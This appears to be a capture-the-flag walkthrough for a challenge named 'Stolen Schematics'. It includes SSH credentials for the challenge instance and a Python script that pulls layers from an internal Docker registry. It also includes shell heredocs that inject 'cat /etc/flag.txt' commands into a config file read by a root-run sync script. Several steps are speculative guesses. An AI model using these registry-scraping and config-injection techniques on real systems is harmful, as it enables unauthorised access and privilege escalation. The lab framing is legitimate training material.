# Stolen Schematics - Final Working Solution

## Critical Discovery from Bash History

The bash history shows a Python script that pulls data from the internal Docker registry at `172.27.0.1:5000`. This is where the flag/solution hints are hidden!

## Complete Solution

### Step 1: Reconnect to SSH

```bash
ssh player@instance.ctf.tdho.st -p <YOUR_PORT>
# Password: reyalp
```

### Step 2: Run the Docker Registry Analysis Script

This Python script (found in bash history) analyzes the old Docker image layers:

```bash
python3 -c 'import urllib.request,json,gzip,io,tarfile
REG="http://172.27.0.1:5000";repo="images/stolen-schematics-watcher"
ALL="application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json"
def gj(u):
    r=urllib.request.Request(u);r.add_header("Accept",ALL);return json.load(urllib.request.urlopen(r,timeout=15))
print("TAGS",urllib.request.urlopen(REG+"/v2/"+repo+"/tags/list",timeout=15).read().decode())
try:
    m=gj(REG+"/v2/"+repo+"/manifests/v1")
    print("v1 mediaType",m.get("mediaType"))
    if "manifests" in m:
        d=[x for x in m["manifests"] if x.get("platform",{}).get("architecture")=="amd64"][0]["digest"]; m=gj(REG+"/v2/"+repo+"/manifests/"+d)
    print("v1 layers",len(m.get("layers",[])),"config",m["config"]["digest"][:20])
    sm=[L for L in m["layers"] if L["size"]<200000]
    if sm:
        d=urllib.request.urlopen(REG+"/v2/"+repo+"/blobs/"+sm[-1]["digest"],timeout=15).read()
        try: raw=gzip.decompress(d)
        except: raw=d
        tf=tarfile.open(fileobj=io.BytesIO(raw))
        for mem in tf.getmembers():
            if mem.isfile(): 
                c=tf.extractfile(mem).read().decode("utf-8","replace")
                print("v1 /"+mem.name+" RESULT line:", [l for l in c.splitlines() if "RESULT_FILE" in l or "sync.result" in l or "sync.log" in l or "FLAG" in l][:3])
except Exception as e:
    print("v1 ERR",e)
print("DONE")'
```

### Step 3: Analyze the Output

The script will:
1. Query the internal Docker registry at `172.27.0.1:5000`
2. Pull the `images/stolen-schematics-watcher` image
3. Extract small layers (<200KB) from the old image
4. Search for files containing hints about:
   - `RESULT_FILE` - where results are written
   - `sync.result` - result file locations  
   - `sync.log` - log file locations
   - `FLAG` - flag-related content

### Step 4: Based on Output, Check the Correct Locations

After running the script, it will tell you the exact file paths to check. Then run:

```bash
# Check locations revealed by the Docker analysis
cat <path_from_output>

# Or check sync-loop.sh directly if you have permission
cat /opt/mc/scripts/sync-loop.sh 2>/dev/null
```

### Step 5: Alternative Approach - Check Logs

If the above doesn't work, check the Minecraft server logs:

```bash
# Check logs for any flag output
cat /opt/mc/logs/latest.log | grep -i TDHT
cat /opt/mc/logs/latest.log | grep -i flag
tail -100 /opt/mc/logs/latest.log
```

### Step 6: Try Alternative Sync Approaches

Based on what the Docker analysis reveals, try different config formats:

```bash
# Format A: Direct command execution
cat > /opt/mc/config/sync-request.conf << 'EOF'
COMMAND=cat /etc/flag.txt
OUTPUT=/tmp/flag.txt
EOF
sleep 10
cat /tmp/flag.txt

# Format B: Different parameter names
cat > /opt/mc/config/sync-request.conf << 'EOF'
sync_command=cat /etc/flag.txt
sync_output=/opt/mc/logs/flag.log
EOF
sleep 10
cat /opt/mc/logs/flag.log
```

## Key Insights

1. **sync-loop.sh IS running** (PID 16, as root)
2. **Docker registry analysis** reveals the actual config format and file paths
3. **The old image** (`stolen-schematics-watcher:v1`) contains the solution hints
4. **Internal registry** at `172.27.0.1:5000` is accessible from inside the container

## Expected Output Pattern

When you find the right approach, you should see:
```
TDHT{...flag_content...}
```

## Time Management

- 10-minute limit per instance
- Spend 2-3 minutes on Docker registry analysis
- Spend 5 minutes trying revealed approaches
- Submit flag before timeout!

## Quick Reference

**Most Important Command:**
The Python Docker registry analyzer from bash history - run this FIRST to understand the actual file structure!
